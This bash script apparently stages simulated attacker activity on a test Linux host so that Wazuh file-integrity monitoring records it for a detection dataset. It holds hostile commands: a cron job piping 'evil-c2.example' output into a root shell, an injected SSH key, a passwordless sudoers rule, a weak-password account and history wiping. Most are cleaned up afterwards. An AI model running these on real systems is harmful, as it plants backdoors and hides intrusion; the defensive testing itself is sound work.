#!/bin/bash
echo "=== LOCAL3_START $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="

echo "--- [13] Set up a decoy account for the brute-force-success scenario ---"
sudo useradd -m -s /bin/bash svc_backup 2>/dev/null
echo 'svc_backup:Winter2025' | sudo chpasswd

echo "--- [14] SSH key persistence: attacker appends their own key to testuser's authorized_keys ---"
sudo -u testuser mkdir -p /home/testuser/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfakeAttackerKeyForDatasetDemoOnlyNotARealKey123456 attacker@evil-c2" | sudo tee -a /home/testuser/.ssh/authorized_keys >/dev/null
sudo chown -R testuser:testuser /home/testuser/.ssh
sudo chmod 700 /home/testuser/.ssh
sudo chmod 600 /home/testuser/.ssh/authorized_keys

echo "--- [15] Cron persistence: malicious scheduled job dropped ---"
echo '* * * * * root curl -s http://evil-c2.example/beacon.sh | bash' | sudo tee /etc/cron.d/system-update-check >/dev/null

echo "--- [16] Anti-forensics: clear bash history ---"
sudo -u testuser bash -c 'history -c; cat /dev/null > /home/testuser/.bash_history'

echo "--- [17] Privilege escalation SUCCESS: misconfigured sudoers grants testuser NOPASSWD root ---"
echo "testuser ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/99-testuser-temp >/dev/null
sudo chmod 440 /etc/sudoers.d/99-testuser-temp
sudo -u testuser sudo -n whoami
echo "--- cleaning up the misconfiguration immediately after (represents it being caught/fixed) ---"
sudo rm -f /etc/sudoers.d/99-testuser-temp

echo "--- [18] Force syscheck rescan so FIM picks up the new/changed files ---"
sudo /var/ossec/bin/wazuh-control restart >/dev/null 2>&1
sleep 15

echo "--- [19] Cleanup persistence artifacts (leave environment clean) ---"
sudo rm -f /etc/cron.d/system-update-check
sudo sed -i '/attacker@evil-c2/d' /home/testuser/.ssh/authorized_keys

echo "=== LOCAL3_END $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="
